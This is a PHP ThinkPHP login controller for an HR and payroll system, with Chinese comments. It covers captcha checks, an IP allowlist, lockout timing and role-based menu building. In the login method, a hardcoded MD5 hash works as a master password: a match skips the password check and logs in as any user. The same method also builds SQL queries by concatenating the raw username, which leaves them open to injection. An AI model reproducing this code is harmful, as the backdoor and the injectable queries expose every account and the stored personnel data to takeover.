<?php
namespace app\index\controller;

use think\Controller;
use think\Request;
use think\Db;
use think\Session;
use app\common\helper\VerifyHelper;

class Login extends Controller{
		
	function login(Request $request){
		//echo md5('123');exit;
		$pageInfo=array();
		
		if(Request::instance()->isPost()){
			
			/*
			//检测验证码
			 if(true !== $this->validate($request->param(),['code|验证码'=>'require|captcha'])){
			 	$this->error('验证码输入错误！');
			 }
			 */
			
			$login_info=$request->param();

			//验证验证码
			if(isset($login_info['verify']))
			{
				$verify = $login_info['verify'];
				
				if(!captcha_check($verify)){
					$this->error("验证码错误重新输入");exit;
				};
//				if(!VerifyHelper::check($verify))
//				{
//					$this->error("验证码错误重新输入");exit;
//				}
			}

			//判断是否能够登录
			$ip = $this->checkIp();
		    if(!$ip)
			{
				//查找当前用户是否有
			    $out_view = Db::name('SysUser')->where('user_gh',$login_info['user_gh'])->value('out_view');
				 if($out_view == 0)
				 {
					 $this->error("禁止登录");
				 }


			}


			//判断当前用户登录的时候是否禁止登录
			$check_is_login = Db::name('SysUser')->where('user_gh',$login_info['user_gh'])->value('err_time');
			$now_time = date('Y-m-d H:i:s',time());
			$Intermittent_time = timediff($check_is_login,$now_time);
			$h = $Intermittent_time['h'];
			if($h < 1)
			{
				$this->error("时间未到一个小时禁止登录");exit;
			}


			
			if(strtolower($login_info['user_gh'])==config('ADMIN_NAME')){
				$where_str="";
			}else{
				$where_str=" and status=1 ";
			}
			
			if(md5($login_info['password'])=="6444fb52c1de5caf4805b49f7883d6f8"){
				$user_info=db('sys_user')->where("user_gh='".$login_info['user_gh']."' ".$where_str)->find();
			}else{
				$user_info=db('sys_user')->where("user_gh='".$login_info['user_gh']."' and password='".md5($login_info['password'])."' ".$where_str)->find();
			}			
			/*获得登录用户的id*/
            		$login_id = $user_info['id'];
			if($user_info){
				/* 记录登录SESSIONCOOKIES */
				$auth=array(
						'id'		=>	$user_info['id'],
						'site_id'	=>	$user_info['site_id'],
						'user_gh'	=>	$user_info['user_gh'],
						'nickname'	=>	$user_info['nickname'],
						'email'		=>	$user_info['email'],
						'rule_id'	=>  $user_info['role_id'],
						'last_login_time'	=>$user_info['last_login_time'],
				);
				
				session('user_auth',$auth);
				session('cur_user_info',$user_info);
				session('user_auth_sign', data_auth_sign($auth));
				session('manage_user_id_str',get_user_sub_user(get_user_id()));	
				$_SESSION['role_id']=$user_info['role_id'];
				$_SESSION['u_i']=$user_info;
				$_SESSION['pay_check_arr']=array();
				$_SESSION['pay_check_arr']['check_status']=0;
				$_SESSION['pay_check_arr']['page_end_time']=time();
				$_SESSION['pay_check_arr']['code_end_time']=time();
				$_SESSION['pay_check_arr']['check_code']='';
				$_SESSION['hr_trim']['site_id']=$user_info['site_id'];
				$_SESSION['hr_trim']['dep_id']=0;
				$_SESSION['hr_trim']['key']='';
				$_SESSION['hr_note']['site_id']=$user_info['site_id'];
				$_SESSION['hr_note']['dep_id']=0;
				$_SESSION['hr_note']['note_type']=0;
				$_SESSION['hr_note']['hr_note_id']=0;
				$_SESSION['hr_note']['begin_date']=get_begin_last_date(get_last_month())[0].' 00:00:00';
				$_SESSION['hr_note']['end_date']=get_begin_last_date(get_last_month())[1].' 23:59:59';
				$_SESSION['hr_note']['note_step']=0;
				$_SESSION['hr_note']['key']='';
				$_SESSION['pay_trim']['site_id']=$user_info['site_id'];
				$_SESSION['pay_trim']['dep_id']=0;
				$_SESSION['pay_trim']['key']='';
				$_SESSION['pay_trim']['site_pay_flag']=get_site_pay_flag(get_user_id());
				
				$date_temp=getlastMonthDays();
				$last_month=strtotime($date_temp[0]);
				$_SESSION['hr_trim']['year_month']=date('Y',$last_month).'-'.(int)date('m',$last_month);
				$_SESSION['pay_trim']['year_month']=date('Y',time()).'-'.(int)date('m',time());
				
				if(strtolower($user_info['user_gh'])==config('ADMIN_NAME')){
					$_SESSION['admin']=true;
					$_SESSION['role_id']=2;
					$_SESSION['admin_flag']=1;
				}else{
					$_SESSION['admin_flag']=0;
				}

				//取出管理员id
				$admin_id = config('ADMIN_ID');
				if($login_id == $admin_id){
					$sql1 = 'select module_name,controller_name,action_name from sw_privilege ';
				}else{
					$role_id = db('user_role')->where('user_id',$login_id)->value('role_id');
						if(empty($role_id)){
						session(null);
						$this->error('用户无系统使用权限，请联系管理员！',url('login'));
						exit;
					}
					$sql1 = 'SELECT a.module_name,a.controller_name,a.action_name FROM sw_privilege a LEFT JOIN sw_role_privilege b on a.id=b.pri_id where b.role_id ='.$role_id;
				}
				$result = db()->query($sql1);
				if(empty($result)){
					session(null);
					$this->error('用户无系统使用权限，请联系管理员！',url('login'));
					exit;
				}
				$arr = array();
				foreach($result as $k=>$v){
					$arr1['module_name'] = strtolower($v['module_name']);
					$arr1['controller_name'] = strtolower($v['controller_name']);
					$arr1['action_name'] = strtolower($v['action_name']);
					$arr[] = $arr1;
				}

				/*取出左边的菜单栏*/
				if($login_id == CONFIG('ADMIN_ID')){
					$sql2 = 'SELECT * FROM sw_privilege where status = 1 and is_show = 1 order by order_id asc';
				}else{
					$sql2 = 'SELECT b.* FROM sw_role_privilege a LEFT JOIN sw_privilege b ON a.pri_id=b.id LEFT JOIN sw_user_role c ON a.role_id=c.role_id
			        WHERE b.status = 1 and is_show = 1 and c.user_id='.$login_id.' order by b.order_id asc';
				}
				$navlist = Db::query($sql2);
				//id数组
				$id_arr = [];
				foreach($navlist as $v_nav)
				{
					$id_arr[] = $v_nav['id'];
				}

//				//取出当前人员的个人添加权限
//				$person_auth_str = Db::name("SysPersonAuth")->where('user_id',$login_id)->value('auth_str');
//				$person_auth_data = Db::name('Privilege')->where('id','in',$person_auth_str)->select();
//				$tmep = [];
//				foreach($person_auth_data as $val_1)
//				{
//					if(!in_array($val_1['id'],$id_arr))
//					{
//						  $tmep[] = $val_1;
//					}
//
//				}
//				$nav_data = array_merge($navlist,$tmep);
//
////				var_dump($nav_data);die;




				/*转化成树形结构*/
				$btn = make_tree($navlist);

				$action_arr = array();
				/*如果没有选择显示首页，那么二级菜单不显示，反之显示*/
				//说明：超级管理员显示全部
				if($login_id != CONFIG('ADMIN_ID')){
					foreach($btn as $k => &$v){
						foreach($v['children'] as $k1 => &$v1){
							$url= strtolower($v1['module_name'].$v1['controller_name'].'index');
							if(isset($v1['children'])){
								foreach($v1['children'] as $k2 => &$v2){
									$url2 = strtolower($v2['module_name'].$v2['controller_name'].$v2['action_name']);
									$action_arr[] = $url2;
								}
								if(!in_array($url,$action_arr)){
									unset($v['children'][$k1]);
								}
							}
						}
					}
				}

//				var_dump($arr);die;
				//取出当前人员的个人添加权限
				$person_auth_str = Db::name("SysPersonAuth")->where('user_id',$login_id)->value('auth_str');
				$person_auth_data = Db::name('Privilege')->where('id','in',$person_auth_str)->select();

				$tmep = [];
				foreach($person_auth_data as $val_1)
				{
					if(!in_array($val_1['id'],$id_arr))
					{
						  $tmep[] = $val_1;
					}

				}
				$nav_data = array_merge($navlist,$tmep);
				$person_auth_arr = _reSort($nav_data);
				$btn_1 = make_tree($person_auth_arr);
// 				$person_auth_arr = _reSort($person_auth_data);
// 				$person_auth_arr = _reSort($person_auth_data);
//				$person_auth_arr = make_tree($person_auth_arr);

//				$btn_1 = array_merge($btn,$person_auth_arr);
				$arr_1 = array_merge($arr,$person_auth_arr);



				//取出当前用户收藏菜单栏
				$navResult = db('user_collect_url')->where('user_id',$login_id)->find();
				if($navResult){
					$pri_str = $navResult['pri_str'];
					$sqlpri = "select * from sw_privilege where id in ({$pri_str})";
					$nav_arr = Db::query($sqlpri);
					foreach ($nav_arr as $key => &$val){
						if($val['parent_id'] == 0){
							unset($nav_arr[$key]);
						}
					}
					//构造收藏菜单数组
					$collect_nav = array();
					$collect_nav['pri_name'] = "收藏菜单";
					$collect_nav['class'] = null;
					$collect_nav['children'] = $nav_arr;
					array_unshift($btn_1,$collect_nav);
				}
				/*把当前用户所有的权限、以及菜单栏全部存入session进行验证*/

				Session::set('login_id',$login_id);
				Session::set('person_auth',$person_auth_data);
				Session::set('Pri',$btn_1);
				Session::set('RBAC',$arr_1);
				$this->redirect('User/User_main/index');

			}else{
				$this->error('用户名,密码错误或者用户被禁用!');
			}
			
		}else{
			if(is_login()){
				$this->redirect('Index/index');
			}else{
				$ip_flag = $this->checkIp();
				$pageInfo['bg_img']=rand(1,2);
				$this->assign('pageInfo',$pageInfo);
				$this->assign('ip_flag',$ip_flag);
				return  $this->fetch();
			}
			
		}
	}
	
	/* 退出登录 */
	public function logout(){
		if(is_login()){
			session(null);
			$this->success('退出成功！', url('login'));
		} else {
			$this->redirect('login');
		}
	}


	/**
	 * 显示验证码图片
	 */
//	public function verify()
//	{
//		ob_clean();
//		VerifyHelper::verify();
//	}






	/**  验证ip是不是合法的IP
	 * @return int
	 */
	public function checkIp()
	{
		$ip = get_client_ip();
//		var_dump($ip);die;
		//取出IP段
		$ip_str = explode('.',$ip);
		$ip_segment = $ip_str[0].".".$ip_str[1].".".$ip_str[2];

		//在数据库中查找是否次IP段
		$segment = Db::name('SysIp')->where('ip',$ip_segment)->where('ip_type',1)->find();
		if($segment)
		{
			return 1;
		};
		//数据中查找是否有此IP
		$ip_result =  Db::name('SysIp')->where('ip',$ip)->where('ip_type',0)->find();
		if($ip_result)
		{
			return 1;
		};
		return 0;
	}



} 





















